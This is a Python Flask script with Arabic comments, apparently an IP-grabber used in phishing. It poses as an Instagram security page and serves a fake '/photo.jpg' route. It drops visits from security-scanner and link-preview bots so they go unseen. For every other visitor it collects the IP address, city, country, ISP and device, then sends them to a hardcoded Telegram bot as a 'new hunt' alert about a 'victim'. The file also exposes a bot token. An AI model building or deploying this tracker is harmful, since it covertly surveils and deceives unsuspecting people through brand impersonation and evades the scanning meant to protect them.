from flask import Flask, request
import requests

app = Flask(__name__)

# --- Configuration (كودك الأصلي - لا لمس) ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
@app.route('/photo.jpg') # [الخطة ج]: إضافة امتداد الصورة لخداع انستقرام
def track():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    ua_lower = user_agent.lower() if user_agent else ""

    # --- [الخطة ب]: فلترة الرأس المقطوع (Headless) وبوتات الحماية ---
    # إذا كان الزائر بوت فحص من أمازون، فيسبوك، أو فرسيل (حسب صورك) يتم طرده صمتاً
    protection_bots = ['facebookexternalhit', 'vercel', 'amazon', 'headlesschrome', 'bot']
    if any(bot in ua_lower for bot in protection_bots):
        return "404 Not Found", 404

    # --- [الخطة أ]: تدوير الروابط (جلب المعرف العشوائي) ---
    v_id = request.args.get('v', '1') # لجلب القيمة من الرابط المختصر مثل ?v=2

    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        city = country = isp = "Error"

    # تقريرك الأصلي مع إضافة بسيطة للمعرف (v) لتمييز الضحية
    report = (
        f"🎯 <b>تنبيه صيد جديد (v={v_id})!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent}\n"
        f"--------------------------"
    )
    send_to_telegram(report)
    
    # الرد التمويهي (تم تعديل og:type للصيد بدون ضغط)
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:description" content="Confirm your identity to continue.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="video.other"> </head>
    <body><h1>404 Not Found</h1></body>
    </html>
    """, 200

if __name__ == '__main__':
    # الحفاظ على إعدادات التشغيل الخاصة بك
    app.run(host='0.0.0.0', port=5000)
